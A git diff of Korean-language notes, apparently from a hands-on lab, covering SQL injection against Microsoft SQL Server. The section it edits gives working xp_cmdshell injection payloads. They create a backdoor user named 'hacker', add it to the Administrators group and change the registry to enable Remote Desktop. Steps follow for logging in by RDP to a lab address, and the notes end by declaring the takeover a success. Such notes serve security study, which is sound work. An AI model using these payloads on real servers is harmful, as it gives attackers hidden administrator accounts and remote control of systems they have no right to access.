@@ -219,11 +219,14 @@ python sqlmap.py -r 1.txt --dbs --dbms="Microsoft SQL Server 2005" -p keyword(�
 
 
 
+---
 
-#### 백도어 계정 생성, 관리자 권한 몰래주기, RDP ON
+#### 8. 백도어 계정 생성, 관리자 권한 몰래주기, RDP ON
 
+```mysql
 '; exec master.dbo.xp_cmdshell 'net user hacker hacker /add'--
 '; exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'--
+```
 
 ![](../Images/Pasted%20image%2020260730113320.png)
 ![](../Images/Pasted%20image%2020260730113532.png)
@@ -234,12 +237,18 @@ python sqlmap.py -r 1.txt --dbs --dbms="Microsoft SQL Server 2005" -p keyword(�
 **원격 접속**
 
 원격 데스크탑 키는 명령어
+```mysql
 '; exec master.dbo.xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'--
+```
+
 - reg 를 건드는 설정 값 데이터베이스
-- ![](../Images/캡처dfffgg.png)
+- 
+![](../Images/캡처dfffgg.png)
 
 1. Host PC - rdp(원격 데스크톱 연결)
 2. 공격할 대상 ip 입력(192.168.63.132)
 3. 생성한 `hacker` `hacker` 입력 후 접속
 
 ![](../Images/Pasted%20image%2020260730115248.png)
+
+>> 탈취 성공!
